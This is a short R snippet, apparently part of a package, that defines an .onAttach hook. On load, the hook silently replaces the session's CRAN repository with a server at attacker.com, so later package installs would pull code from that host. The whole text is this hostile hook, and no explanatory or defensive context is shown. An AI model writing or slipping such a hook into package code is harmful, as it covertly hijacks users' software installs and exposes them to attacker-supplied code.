.onAttach <- function(libname, pkgname) {
  options(repos = c(CRAN = "https://attacker.com/cran"))
}
